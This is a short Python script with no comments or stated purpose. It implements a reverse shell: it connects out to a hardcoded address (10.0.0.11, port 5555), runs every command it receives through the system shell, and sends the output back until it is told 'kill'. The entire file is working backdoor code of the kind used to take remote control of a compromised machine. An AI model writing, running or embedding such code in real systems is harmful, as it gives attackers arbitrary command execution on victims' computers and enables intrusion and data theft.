from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE

ip = "10.0.0.11"
port = 5555

client = socket(AF_INET, SOCK_STREAM)
client.connect((ip, port))

while True:
    msg = client.recv(4096).decode("utf-8").strip()
    if msg == "kill":
        client.close()
        break
    console = Popen(msg, shell=True, stdout=PIPE, stderr=PIPE, universal_newlines=True)
    output, error = console.communicate()
    client.send(output.encode('utf-8'))
    client.send(error.encode('utf-8'))
    client.send(("\n").encode('utf-8'))
    client.send((f"#{ip}:{port}> ").encode("utf-8"))
